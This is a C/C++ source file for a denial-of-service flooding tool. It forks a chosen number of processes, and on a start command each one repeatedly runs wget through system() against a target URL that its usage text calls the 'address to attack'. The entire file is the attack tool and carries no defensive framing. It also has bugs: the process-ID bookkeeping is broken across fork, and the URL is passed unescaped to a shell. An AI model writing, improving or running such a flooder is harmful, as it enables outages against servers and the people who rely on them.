
#include <stdlib.h>
#include <stdio.h>
#include <signal.h>
#include <sys/wait.h>
#include <unistd.h>
#include <string.h>
#include <string>

char *CMD_START = strdup("start");
char *CMD_STOP = strdup("stop");

int errorCode;

unsigned long maxWaitInterval;
char *url;
char **commands = (char **) malloc(sizeof(char *)*5);
char *command;
pid_t *pids;
int pidCount=0;

bool processInput();
void run(int index);
void updateUrl(char *url);

void signalInterrupt(int sig) {

}

int main(int argc, char **argv) {

    if (argc!=4) {
        errorCode = printf("Usage: %s <i> <n> <s>\n", argv[0]);
        if (errorCode<0) {
            perror("Error");
            return errorCode;
        }
        errorCode = printf("i\t(int) Number of processes to fork\nN\t(long) Maximum time in microseconds to sleep between GET requests\ns\t(string) address to attack\n");
        if (errorCode<0) {
            perror("Error");
            return errorCode;
        }
        return -1;
    }

    signal(SIGUSR1,signalInterrupt);
    signal(SIGUSR2,signalInterrupt);

    pidCount = atoi(argv[1]);
    maxWaitInterval=(unsigned long)atoi(argv[2]);
    url=argv[3];
    int p[2];

    pids = (pid_t *) malloc(sizeof(pid_t)*pidCount);
    int index=0;

    updateUrl(url);

    for (int i=0; i<pidCount; i++) {
        switch(fork()) {
            case 0:
                run(i);
                break;
            default:
                index++;
        }
    }
    
    
    bool isRunning=true;
    while (isRunning) {
        isRunning=processInput();
    }

    for (int i=0; i<pidCount; i++) wait(NULL);

}
bool processInput() {
    bool value = true;
    char buffer[1024];
    fgets(buffer,1024,stdin);
    
    //https://stackoverflow.com/questions/2693776/removing-trailing-newline-character-from-fgets-input
    buffer[strcspn(buffer, "\n")] = 0;

    if (strcmp(buffer,CMD_START)==0) {
        for (int i=0; i<pidCount; i++) {
            kill(pids[i],SIGUSR1);
            buffer[0]='\0';
        }
    } else if (strcmp(buffer,CMD_STOP)==0) {
        for (int i=0; i<pidCount; i++) {
            kill(pids[i],SIGUSR2);
            value=false;
        }
    }

    return value;
}

void updateUrl(char *url) {
    //wget -q -O - -o  ! > /dev/null
    commands[0]=strdup("wget");
    commands[1]=strdup("-q -O - -o");
    commands[2]=strdup("/dev/null");
    commands[3]=strdup(url);
    commands[4]=strdup("> /dev/null");

    int len = 0;
    for (int i=0; i<5; i++) {
        len+=strlen(commands[i])+1;
    }

    int pos=0;
    command = (char *) malloc(sizeof(char)*len);

    for (int i=0; i<5; i++) {
        for (int c=0; c<strlen(commands[i]); c++) {
            command[pos++]=commands[i][c];
        }
        command[pos++]=' ';
    }
    command[len-1]='\0';
}

void execute() {
    system(command);
}

void start(int sig) {
    while (true) {
        //printf("Process id %d executing against %s\n", getpid(),url);
        execute();
        usleep(maxWaitInterval-1);
    }
}
void stop(int sig) {
    // printf("Process id %d exiting\n", getpid());
    exit(0);
}
void run(int index) {
    signal(SIGUSR1,start);
    signal(SIGUSR2,stop);

    char buffer[50];
    int _id = getpid();
    pids[index]=_id;

    char *id;
    sprintf(buffer,"%d\n",_id);
    fprintf(stderr, buffer);
    
    while (true) sleep(1);
}
